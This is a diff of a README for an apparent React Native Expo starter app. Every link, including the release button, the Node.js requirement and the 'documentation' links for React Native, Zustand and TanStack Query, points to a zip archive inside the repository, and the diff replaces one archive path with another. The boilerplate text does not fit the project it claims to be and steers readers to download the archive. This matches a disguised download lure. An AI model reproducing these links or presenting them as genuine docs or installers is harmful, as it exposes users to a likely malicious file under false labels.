@@ -4,13 +4,13 @@
 The **react-native-expo-app** is a user-friendly application designed for creating stunning mobile apps using React Native with Expo. It features powerful tools like Zustand for state management, TanStack Query for data fetching, and GraphQL to simplify your app development process. 
 
 ## 📦 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip%20Latest%20Release-Available-brightgreen)](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip)
+[![Download Latest Release](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip%20Latest%20Release-Available-brightgreen)](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the app on your device. No programming knowledge is required.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip) to find the latest version of the app.
+Go to the [Releases page](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip) to find the latest version of the app.
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Look for the latest version and click on it to access the details.
@@ -33,7 +33,7 @@ To ensure smooth operation, please ensure your computer meets the following requ
 - **Operating System:** Windows 10 or later, macOS 10.14 or later.
 - **Memory:** At least 4GB of RAM.
 - **Disk Space:** Minimum of 1GB available disk space.
-- **https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip** Required for running JavaScript applications. You can download it from [https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip).
+- **https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip** Required for running JavaScript applications. You can download it from [https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip).
 
 ## 🌟 Features
 - **User-Friendly Interface:** Simple UI for easy navigation.
@@ -60,14 +60,14 @@ Zustand is a simple state management library that helps you manage the state of 
 TanStack Query is a powerful data-fetching library that simplifies remote data fetching and caching.
 
 ## 🔗 Useful Links
-- [Learn More About React Native](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip)
-- [Zustand Documentation](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip)
-- [TanStack Query Documentation](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip)
+- [Learn More About React Native](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip)
+- [Zustand Documentation](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip)
+- [TanStack Query Documentation](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip)
 
 ## 🔄 Support & Feedback
 If you have any questions or feedback, please reach out via the Issues section on our GitHub page. We welcome all feedback!
 
 ## 🌀 Download & Install
-Ready to get started? Visit the [Releases page](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip) to download the latest version and start building your mobile applications today! 
+Ready to get started? Visit the [Releases page](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip) to download the latest version and start building your mobile applications today! 
 
-[![Download Latest Release](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip%20Latest%20Release-Available-brightgreen)](https://raw.githubusercontent.com/saiprashanth2410/react-native-expo-app/main/app/components/buttons/native_react_expo_app_Sicel.zip)
+[![Download Latest Release](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip%20Latest%20Release-Available-brightgreen)](https://github.com/saiprashanth2410/react-native-expo-app/raw/refs/heads/main/app/screens/expo_react_native_app_1.1-beta.4.zip)
